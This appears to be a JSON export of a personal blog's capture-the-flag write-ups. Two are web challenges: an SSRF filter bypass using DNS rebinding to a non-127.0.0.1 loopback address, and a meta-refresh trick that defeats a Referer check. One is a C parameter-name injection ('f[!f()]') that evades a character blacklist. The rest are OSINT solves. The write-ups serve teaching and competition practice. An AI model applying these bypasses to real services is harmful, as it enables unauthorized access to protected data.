[{"content":"Photo Archiver (39 solves)\nThe description of the challange:\nDon\u0026rsquo;t you hate when a very cool page goes down and all of your bookmarked memes go down? That\u0026rsquo;s why I created a service to archive random URLs on the Internet.\nAlso, the source code is provided when you visit the website given in the challenge.\nVulnerability Analysis SSRF protection bypass The SSRF filter tries to block requests to localhost by resolving the hostname and checking if it is 127.0.0.1:\nresolved = resolve_domain(parsed.hostname) if not resolved: abort(400, \u0026#34;bad host\u0026#34;) logging.info(\u0026#34;resolved: %s\u0026#34;, resolved) if resolved == \u0026#34;127.0.0.1\u0026#34;: abort(400, \u0026#34;bad ip\u0026#34;) However, the check is too narrow:\nIt only blocks 127.0.0.1, but not other loopback addresses like 127.0.0.2, 127.0.0.3, etc. The DNS rebinded domain can resolve to 127.0.0.2, which is still a loopback address, but not exactly 127.0.0.1. This means you can use any other loopback address (except 127.0.0.1, which is sanitized) to reach localhost services, and the filter won\u0026rsquo;t catch it. Flag function The flag is protected by the following route:\n@app.route(\u0026#34;/flag\u0026#34;) def get_flag(): remote_ip = request.environ.get(\u0026#39;HTTP_X_REAL_IP\u0026#39;) if remote_ip and remote_ip != \u0026#34;127.0.0.1\u0026#34;: abort(401) return make_response(FLAG) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=23612) The /flag endpoint is designed to only return the flag if the request appears to come from localhost. It checks the HTTP_X_REAL_IP header, and if it\u0026rsquo;s missing or set to 127.0.0.1, the flag is returned. Otherwise, access is denied.\nHowever, when the server itself makes a request (as in SSRF), this header is often not set at all, or the request is seen as coming from localhost, which allows the flag to be returned.\nExploit To exploit this, submit the following URL to the archive form:\nhttp://\u0026lt;dns-rebound-domain\u0026gt;:23612/flag#.png The server downloads the flag and saves it as an image (\u0026lt;img src=\u0026quot;/image/flag\u0026quot;\u0026gt;) in your session storage.\nYou can then visit /image/flag to retrieve the flag (it will be downloaded as a file; you need to open it in a text editor).\necsc25{TOCTOU-is-a-weird-acronym} Why does it work? Incomplete SSRF filter only blocks 127.0.0.1, not all loopback addresses (127.0.0.0/8). DNS rebinding allows you to use attacker-controlled DNS to resolve to internal or loopback addresses, bypassing SSRF filters that only check for 127.0.0.1 The /flag endpoint checks HTTP_X_REAL_IP. Since the request is made locally, this header is likely missing or set to None, so it allows the request. The fragment # is ignored by the HTTP protocol, so the server fetches /flag, not /flag#.png. The .png at the end passes the file extension check. ","permalink":"https://manfcg.pl/en/posts/ecsc25-photo-archiver/","summary":"\u003ch2 id=\"photo-archiver\"\u003ePhoto Archiver\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003e(39 solves)\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eThe description of the challange:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eDon\u0026rsquo;t you hate when a very cool page goes down and all of your bookmarked memes go down? That\u0026rsquo;s why I created a service to archive random URLs on the Internet.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eAlso, the \u003ca href=\"https://photo-archiver.ecsc25.hack.cert.pl/source\"\u003esource code\u003c/a\u003e is provided when you visit the website given in the challenge.\u003c/p\u003e\n\u003ch2 id=\"vulnerability-analysis\"\u003eVulnerability Analysis\u003c/h2\u003e\n\u003ch3 id=\"ssrf-protection-bypass\"\u003eSSRF protection bypass\u003c/h3\u003e\n\u003cp\u003eThe SSRF filter tries to block requests to localhost by resolving the hostname and checking if it is \u003ccode\u003e127.0.0.1\u003c/code\u003e:\u003c/p\u003e","title":"ECSC 25 Polish Qualifications - Photo Archiver - Web challange"},{"content":"Caller (51 solves)\nThe description of the challange:\nNaming things is hard.\nAdditionally a netcat service is provided, that runs the following:\nimport os import uuid def main(): FLAG = open(\u0026#34;flag.txt\u0026#34;, \u0026#39;r\u0026#39;).read().encode() arg = input(\u0026#34;\u0026gt; \u0026#34;) blacklist = [\u0026#39;{\u0026#39;, \u0026#39;}\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39;\\n\u0026#39;] if len(arg) \u0026gt; 10 or any([c in arg for c in blacklist]): print(\u0026#34;Bad input!\u0026#34;) return template = f\u0026#34;\u0026#34;\u0026#34; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; char* f(){{ char* flag = \u0026#34;{FLAG}\u0026#34;; printf(\u0026#34;%s\u0026#34;,flag); return flag; }} void g(char* {arg}){{}} int main(){{ g(NULL); return 0; }} \u0026#34;\u0026#34;\u0026#34; name = \u0026#34;test\u0026#34; source = f\u0026#34;/tmp/{name}.c\u0026#34; outfile = f\u0026#34;/tmp/{name}\u0026#34; open(source, \u0026#39;w\u0026#39;).write(template) os.system(f\u0026#34;export PATH=$PATH:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin \u0026amp;\u0026amp; gcc {source} -o {outfile}\u0026#34;) os.system(f\u0026#34;{outfile}\u0026#34;) os.remove(source) os.remove(outfile) main() Vulnerability Analysis Input injection The vulnerability lies in how the user input is inserted directly into a C function declaration as the name of a parameter:\nvoid g(char* {arg}){{}} Although there is a blacklist in place to filter characters like {, }, ;, and \\n, the application does not validate whether the input is a valid C identifier. This leads to the possibility of injecting arbitrary expressions in place of the parameter name, as long as the input stays within 10 characters and avoids the blacklisted characters.\nFlag function The flag is stored in the f() function:\nchar* f(){ char* flag = \u0026#34;{FLAG}\u0026#34;; printf(\u0026#34;%s\u0026#34;,flag); return flag; } We need to find a way to call this function during runtime.\nExploit Since the user input is inserted directly as a parameter name (without quotes or escaping), we can exploit C\u0026rsquo;s allowance of function calls or expressions inside brackets for array indexing or pointer operations.\nFor example, this input:\nf[!f()] Gets injected like this:\nvoid g(char* f[!f()]) { } This results in:\nA call to f() during array indexing expression evaluation - which prints the flag (printf(\u0026quot;%s\u0026quot;,flag);). The result of !f() is used as an array index. But we don\u0026rsquo;t care about its value - we just need the side effect of calling f(). \u0026gt; f[!f()] b\u0026#39;ecsc25{thats_some_weird_variable_name}\u0026#39; Why does it work? The code compiles because C allows expressions like type name[expression] in parameter declarations. f[!f()] looks like an array of pointers named f with size !f() - but f() is called as part of evaluating that. The expression !f() coerces the return value of f() (a non-null pointer) into a boolean, then negates it. Crucially, evaluating !f() calls f()as part of that process. Because f() contains printf(\u0026quot;%s\u0026quot;, flag);, each evaluation of !f() triggers the flag to be printed, even though the boolean result (0 or 1) is irrelevant to the program’s logic. Blacklist bypass: Since f[!f()] contains no braces {}, semicolons ;, or newlines, and is under 10 characters, it bypasses the simple input filter while fully leveraging C’s type and expression rules. ","permalink":"https://manfcg.pl/en/posts/ecsc25-caller/","summary":"\u003ch2 id=\"caller\"\u003eCaller\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003e(51 solves)\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eThe description of the challange:\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eNaming things is hard.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eAdditionally a \u003ca href=\"https://ctf101.org/faq/connecting-to-services/\"\u003enetcat\u003c/a\u003e service is provided, that runs the following:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003eos\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003euuid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003emain\u003c/span\u003e\u003cspan class=\"p\"\u003e():\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003eFLAG\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;flag.txt\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;r\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eread\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eencode\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003earg\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003einput\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026gt; \u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003eblacklist\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;{\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;}\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"nb\"\u003elen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003earg\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e10\u003c/span\u003e \u003cspan class=\"ow\"\u003eor\u003c/span\u003e \u003cspan class=\"nb\"\u003eany\u003c/span\u003e\u003cspan class=\"p\"\u003e([\u003c/span\u003e\u003cspan class=\"n\"\u003ec\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003earg\u003c/span\u003e \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"n\"\u003ec\u003c/span\u003e \u003cspan class=\"ow\"\u003ein\u003c/span\u003e \u003cspan class=\"n\"\u003eblacklist\u003c/span\u003e\u003cspan class=\"p\"\u003e]):\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nb\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Bad input!\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003etemplate\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"sa\"\u003ef\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e#include \u0026lt;stdio.h\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e#include \u0026lt;string.h\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003echar* f()\u003c/span\u003e\u003cspan class=\"se\"\u003e{{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    char* flag = \u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003eFLAG\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    printf(\u0026#34;%s\u0026#34;,flag);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    return flag;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\u003c/span\u003e\u003cspan class=\"se\"\u003e}}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003evoid g(char* \u003c/span\u003e\u003cspan class=\"si\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003earg\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e)\u003c/span\u003e\u003cspan class=\"se\"\u003e{{}}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003eint main()\u003c/span\u003e\u003cspan class=\"se\"\u003e{{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    g(NULL);\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e    return 0;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\u003c/span\u003e\u003cspan class=\"se\"\u003e}}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003ename\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;test\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003esource\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"sa\"\u003ef\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/tmp/\u003c/span\u003e\u003cspan class=\"si\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003ename\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e.c\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003eoutfile\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"sa\"\u003ef\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/tmp/\u003c/span\u003e\u003cspan class=\"si\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003ename\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esource\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;w\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etemplate\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003eos\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esystem\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sa\"\u003ef\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;export PATH=$PATH:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin \u0026amp;\u0026amp; gcc \u003c/span\u003e\u003cspan class=\"si\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003esource\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e -o \u003c/span\u003e\u003cspan class=\"si\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003eoutfile\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003eos\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esystem\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sa\"\u003ef\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003eoutfile\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003eos\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eremove\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003esource\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003eos\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eremove\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eoutfile\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003emain\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"vulnerability-analysis\"\u003eVulnerability Analysis\u003c/h2\u003e\n\u003ch3 id=\"input-injection\"\u003eInput injection\u003c/h3\u003e\n\u003cp\u003eThe vulnerability lies in how the user input is inserted directly into a C function declaration as the name of a parameter:\u003c/p\u003e","title":"ECSC 25 Polish Qualifications - Caller - Misc challange"},{"content":"Introduction I solved the OSINT challange called \u0026ldquo;Noticed?\u0026rdquo; from CTF 1753CTF, more information about this CTF can be found here\nNoticed? I do not hide the fact that it was an interesting challenge. I had just some text and the flag had to be drawn from it.\nWell, but this text was from the 1753ctf teaser I watched - so immediately after seeing this text I went to youtube\nI was wondering what to do with this video. I watched it a dozen times, googled it on social media platforms, but still without a flag.\nBut after a while, I decided to watch it frame by frame, because maybe the flag is hidden somewhere on an individual frame.\nI downloaded this video, used the ffmpeg option and extracted each frame:\nffmpeg -i ctf.mp4 frame_%00004d.jpg After looking through each frame, I found the one with the flag on it, which is frame number 1444\n1753c{I_b3c4m3_a_h4ck3r}\n","permalink":"https://manfcg.pl/en/posts/1753ctf-noticed/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eI solved the OSINT challange called \u0026ldquo;Noticed?\u0026rdquo; from CTF 1753CTF, more information about this CTF can be found \u003ca href=\"https://ctftime.org/event/2639/\"\u003ehere\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"osint_noticed\" loading=\"lazy\" src=\"/en/posts/1753ctf-noticed/osint_noticed.png\"\u003e\u003c/p\u003e\n\u003ch2 id=\"noticed\"\u003eNoticed?\u003c/h2\u003e\n\u003cp\u003eI do not hide the fact that it was an interesting challenge. I had just some text and the flag had to be drawn from it.\u003c/p\u003e\n\u003cp\u003eWell, but this text was from the 1753ctf teaser I watched - so immediately after seeing this text I went to \u003ca href=\"https://www.youtube.com/watch?v=yRghHj9dkoo\"\u003eyoutube\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eI was wondering what to do with this video. I watched it a dozen times, googled it on social media platforms, but still without a flag.\u003c/p\u003e","title":"1753CTF 2025 - Noticed? - OSINT challange"},{"content":"Introduction I solved the Editor challenge in the Web category. More info about this CTF is here\nEditor I went to the page that was in the challange description, and I was prompted with the message \u0026ldquo;Forbidden\u0026rdquo;\nI set up the server locally by downloading the attachment, then going into the backend and typing python server.py\nI went to the site I put up locally (and again forbidden)\nI checked the source code of this forbidden site\nand I added the following code snippet to \u0026lt;head\u0026gt;\n\u0026lt;meta http-equiv=\u0026#34;refresh\u0026#34; content=\u0026#34;0;url=http://chals.swampctf.com:47821/flag.txt\u0026#34;\u0026gt; After this, flag popped up:\nswampCTF{c55_qu3r135_n07_j5}\nWhy it works? I uploaded the meta tag into the HTML: The \u0026lt;meta http-equiv=\u0026quot;refresh\u0026quot; content=\u0026quot;X;url=Y\u0026quot;\u0026gt; tells the browser to redirect the page. The content=\u0026quot;0\u0026quot; means redirect immediately (0 seconds delay). The url=http://chals.swampctf.com:47821/flag.txt indicates the location of the redirection. In this case, it is also the place where the flag is stored. When the site renders HTML: The browser thinks it is loading a normal page. The meta refresh forces the browser to go to the flag file. Bypassing the Flask Server’s Restriction: The Flask app checks the Referer header to block direct file access. However, since the meta refresh comes from an allowed source (my local hosted site), the server treats it as a valid request. The browser follows the redirect and displays the flag. ","permalink":"https://manfcg.pl/en/posts/swamp-editor/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eI solved the Editor challenge in the Web category. More info about this CTF is \u003ca href=\"https://ctftime.org/event/2573\"\u003ehere\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"Editor\" loading=\"lazy\" src=\"/en/posts/swamp-editor/editor.png\"\u003e\u003c/p\u003e\n\u003ch2 id=\"editor\"\u003eEditor\u003c/h2\u003e\n\u003cp\u003eI went to the page that was in the challange description, and I was prompted with the message \u0026ldquo;Forbidden\u0026rdquo;\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"forbidden\" loading=\"lazy\" src=\"/en/posts/swamp-editor/forbidden.png\"\u003e\u003c/p\u003e\n\u003cp\u003eI set up the server locally by downloading the attachment, then going into the backend and typing \u003ccode\u003epython server.py\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eI went to the site I put up locally (and again forbidden)\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"forbidden\" loading=\"lazy\" src=\"/en/posts/swamp-editor/forbidden.png\"\u003e\u003c/p\u003e","title":"swampCTF 2025 - Editor - Web challange"},{"content":"Introduction I have solved all 3 of the 3 OSINT tasks. More info about this CTF is here\nParty Time! It was a simple challenge - and I\u0026rsquo;ve got first blood on it! The goal was to find a location from a photo. To solve this challange I simply extracted the metadata, and made it flag with it (the syntax was given to us in the challange description).\nI used exiftool to check metadata in this photo:\nAnd after conversion from degrees-minutes-seconds (DMS) notation to decimal degrees (DD) notation I could use this data to form the flag.\nswampCTF{29.652867,82.333244}\nThe real coordinates were 29.652867 -82.333244, but the flag format did not include a minus sign\nParty Time! Level 2 This was also a simple challenge, but I took the hint because I wanted to know exactly where to expect the flag. To do this challange I had to know where the location was from the first challange named Party Time!. The goal was to find a location of nearest fast food. To solve this challange I went on google maps and started looking around for the nearest fast food place, the moment I spotted several of them I used that hint I mentioned earlier - it also gave me valuable advice \u0026ldquo;The reviews love the racecar fast service.\u0026rdquo; , after looking at Checkers fast food I went into the reviews and sorted them from the newest. Scrolling down a bit I noticed a flag\nAnd when I went to Checkers reviews:\nswampCTF{Checkers_Yum}\nOn Thin Ice This challenge was a bit harder. The description told me to search for a well rated rink and in addition there was a downloadable attachment that included a dark photo.\nI did exiftool on this photo and I noticed something interesting\nDescription and title contain hexadecimal characters, I decoded them with Python\nimport binascii hex_string = \u0026#34;D3A6D0BAD0BCD18BD181D3A7D0B420D0B2D0BED181D18CD0BAD0BED0B22E20D09CD0B5D0B7D0B4D0BBD183D0BD2E\u0026#34; decoded_text = bytes.fromhex(hex_string).decode(\u0026#34;utf-8\u0026#34;, errors=\u0026#34;ignore\u0026#34;) print(decoded_text) The output was: Ӧкмысӧд воськов. Мездлун.\nI used Google Translator to translate it into English, the translated text is \u0026ldquo;Step eight. Freedom.\u0026rdquo; After quick google, I found out that this is a mission from Call of Duty: Black Ops\nAfter scrolling down a bit, I also noticed the location of this mission\nAfter going to Google Maps and typing \u0026ldquo;Vorkuta ice rink\u0026rdquo; in the search bar I found an ice rink, when I looked at reviews, I found the flag as the account name.\nswampCTF{ForUM4sOnN0tForM3}\n","permalink":"https://manfcg.pl/en/posts/swamp-osint/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eI have solved all 3 of the 3 OSINT tasks. More info about this CTF is \u003ca href=\"https://ctftime.org/event/2573\"\u003ehere\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"osint\" loading=\"lazy\" src=\"/en/posts/swamp-osint/osint.png\"\u003e\u003c/p\u003e\n\u003ch2 id=\"party-time\"\u003eParty Time!\u003c/h2\u003e\n\u003cp\u003e\u003cimg alt=\"party time\" loading=\"lazy\" src=\"/en/posts/swamp-osint/party_time.png\"\u003e\n\u003cimg alt=\"first blood\" loading=\"lazy\" src=\"/en/posts/swamp-osint/first.png\"\u003e\u003c/p\u003e\n\u003cp\u003eIt was a simple challenge - and 